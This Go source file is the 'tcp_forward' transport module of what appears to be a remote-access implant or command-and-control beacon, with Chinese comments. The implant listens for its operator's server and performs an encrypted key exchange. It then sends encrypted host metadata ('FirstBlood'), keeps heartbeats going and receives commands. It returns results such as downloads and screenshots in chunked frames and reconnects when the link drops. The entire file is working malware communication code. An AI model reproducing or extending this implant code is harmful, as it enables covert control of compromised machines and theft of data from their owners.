//go:build transport_tcp_forward || transport_multi

package main

import (
	"encoding/binary"
	"fmt"
	"implant/core/app"
	"implant/core/communication"
	"implant/core/debuglog"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"net"
	"sync"
	"time"
)

// NewTransport 构造 tcp_forward 传输（单二进制 build tag 入口）
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("tcp_forward", newTCPForwardTransport)
	listenerType = "tcp_forward"
}

func newTCPForwardTransport() transportClient {
	return &TCPForwardClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (s *TCPForwardClient) IsConnected() bool { return s.connected }

// ReconnectMgr 返回重连管理器
func (s *TCPForwardClient) ReconnectMgr() *reconnect.ReconnectManager { return s.reconnectMgr }

type TCPForwardClient struct {
	Listener     net.Listener
	Connection   *net.TCPConn
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	stopCh       chan struct{} // 心跳 goroutine 退出信号
	sendMutex    sync.Mutex    // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
}

func (s *TCPForwardClient) fail() {
	s.connected = false
	// K10: close/nil 纳入发送锁（原与 rawSend 竞态，recover 掩盖 nil panic）
	s.closeClient()
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectFailed()
	}
}

// closeClient 在发送锁内关闭并置空连接
func (s *TCPForwardClient) closeClient() {
	s.sendMutex.Lock()
	defer s.sendMutex.Unlock()
	if s.Connection != nil {
		s.Connection.Close()
		s.Connection = nil
	}
}

// closeClientLocked 调用方已持有 sendMutex 时使用
func (s *TCPForwardClient) closeClientLocked() {
	if s.Connection != nil {
		s.Connection.Close()
		s.Connection = nil
	}
}

// kxHandshake 会话前密钥交换（与反向 tcp 同协议，见 transport_tcp.go）。
//
// 服务端侧无需改动：forward 复用 HandleTcpConnectionForWithKeys，
// KX case 在共享的消息循环里。这里只补 beacon 侧"主动发 KX 帧"的那一半。
func (s *TCPForwardClient) kxHandshake() {
	kx, err := encrypt.NewKeyExchange()
	if err != nil {
		return
	}
	if err := s.rawSend(utils.BytesCombine(utils.WriteInt(kxMsgType), []byte(kx.HeaderValue()))); err != nil {
		return
	}
	if err := s.Connection.SetReadDeadline(time.Now().Add(app.RecvDeadline())); err != nil {
		return
	}
	total, err := communication.ReadFramedLength(s.Connection)
	if err != nil || total < 8 {
		return
	}
	payload, err := communication.ReadFramedPayload(s.Connection, total)
	if err != nil || len(payload) < 4 {
		return
	}
	if int(binary.BigEndian.Uint32(payload[:4])) != kxMsgType {
		return
	}
	peerPub, err := encrypt.ParsePeerPublicKey(string(payload[4:]))
	if err != nil {
		return
	}
	salt, _ := app.GetListenerKeyConfig(listenerType)
	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
	if err != nil {
		return
	}
	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
		return
	}
	utils.MetaInfo = nil
	debuglog.Printf("🔑 [TCP-FWD-KX] 会话前密钥交换完成，已替换静态主密钥\n")
}

// Connect 在 spec（listenAddr:port）上监听并 Accept 服务端连入，然后 FirstBlood + 会话密钥 + 心跳。
func (s *TCPForwardClient) Connect(spec string) error {
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectAttempt()
	}
	// 【重连修复】关闭旧监听器/旧连接：fail() 只清理连接，runLoop 重连时旧 Listener
	// 仍占用端口 → net.Listen EADDRINUSE 永久失败（客户端长期离线/连不上）
	s.closeClient()
	if s.Listener != nil {
		s.Listener.Close()
		s.Listener = nil
	}
	listener, err := net.Listen("tcp", spec)
	if err != nil {
		s.fail()
		return err
	}
	s.Listener = listener
	debuglog.Printf("✅ [TCP-FORWARD] 监听 %s，等待服务端连接...\n", spec)

	conn, err := listener.Accept()
	if err != nil {
		listener.Close()
		s.fail()
		return err
	}
	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		conn.Close()
		s.fail()
		return fmt.Errorf("非 TCP 连接")
	}
	// TCP keepalive：服务端崩溃/重启（RST/FIN）与黑洞网络下快速发现半开连接
	tcpConn.SetKeepAlive(true)
	tcpConn.SetKeepAlivePeriod(30 * time.Second)
	s.Connection = tcpConn
	s.connected = true

	// 会话前 ECDH 交换（forward 模式下 beacon 是 Accept 方，但协议角色不变：
	// 仍由 beacon 发 firstBlood，所以交换握手也由 beacon 发起）。
	// 服务端侧复用 HandleTcpConnectionForWithKeys，KX case 已在共享循环里。
	s.kxHandshake()

	// MetaInfo + FirstBlood
	if len(utils.MetaInfo) == 0 {
		utils.MetaInfo, _ = utils.EncryptedMetaInfo()
		utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
	}
	if err := s.rawSend(utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
		s.fail()
		return err
	}

	// 会话密钥（tcp_forward 用占位符 key，与服务端 tcp_forward 分支一致）
	salt, masterKey := app.GetListenerKeyConfig("tcp_forward")
	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
		s.fail()
		return err
	}
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectSuccess()
	}

	// 心跳：重连时先停旧心跳循环 + 关旧 stopCh，防 goroutine 随重连堆积（time.Ticker.Stop 不关 channel，for-range 会永久阻塞）
	if s.stopCh != nil {
		close(s.stopCh)
	}
	s.stopCh = make(chan struct{})
	stop := s.stopCh
	go app.HeartbeatLoop(stop, s.keepAlive)

	debuglog.Printf("✅ [TCP-FORWARD] 服务端连入: %s\n", tcpConn.RemoteAddr())
	return nil
}

// Recv 读取一条命令：4字节长度 + 载荷 + base64 + 解密。
func (s *TCPForwardClient) Recv() ([]byte, error) {
	if s.Connection == nil || !s.connected {
		s.fail()
		return nil, fmt.Errorf("未连接")
	}
	// 读超时：服务端每心跳回复 ack，健康连接不会超时；超时说明服务端半开/死亡，触发重连
	if err := s.Connection.SetReadDeadline(time.Now().Add(app.RecvDeadline())); err != nil {
		s.fail()
		return nil, err
	}
	// 【P2-5】共享帧管线：长度前缀 + 上限校验（K3）+ 载荷读取 + 解码
	total, err := communication.ReadFramedLength(s.Connection)
	if err != nil {
		s.fail()
		return nil, err
	}
	if total == 0 {
		return nil, nil
	}
	if total > 1<<20 {
		// 大消息（下载/截图等）：按传输速率放宽读超时，避免慢链路误判超时
		s.Connection.SetReadDeadline(time.Now().Add(app.RecvDeadline() + time.Duration(total/50_000)*time.Second))
	}
	payload, err := communication.ReadFramedPayload(s.Connection, total)
	if err != nil {
		s.fail()
		return nil, err
	}
	return communication.DecodeFramePayload(payload)
}

// SendResult 按 TCP 协议分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet，再分块写。
func (s *TCPForwardClient) SendResult(b64Packet []byte) error {
	msgToSend := utils.BytesCombine(utils.WriteInt(2), communication.FrameResult(b64Packet))
	return s.rawSend(msgToSend)
}

func (s *TCPForwardClient) rawSend(msg []byte) error {
	s.sendMutex.Lock()
	defer s.sendMutex.Unlock()
	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("[SEND-PANIC] %v\n", r)
		}
	}()
	if s.Connection == nil {
		return fmt.Errorf("连接为空")
	}
	msgToSend := utils.BytesCombine(utils.WriteInt(len(msg)), msg)
	// 【P2-5】共享分块写（50KB/块）
	if err := communication.WriteChunked(s.Connection, msgToSend); err != nil {
		// K10: 已持发送锁，用 locked 版本避免死锁
		s.connected = false
		s.closeClientLocked()
		if s.reconnectMgr != nil {
			s.reconnectMgr.OnReconnectFailed()
		}
		return err
	}
	return nil
}

func (s *TCPForwardClient) keepAlive() {
	s.rawSend(communication.HeartbeatMsg())
}

func (s *TCPForwardClient) Close() error {
	if s.stopCh != nil {
		close(s.stopCh)
		s.stopCh = nil
	}
	if s.Connection != nil {
		s.Connection.Close()
	}
	if s.Listener != nil {
		s.Listener.Close()
	}
	return nil
}
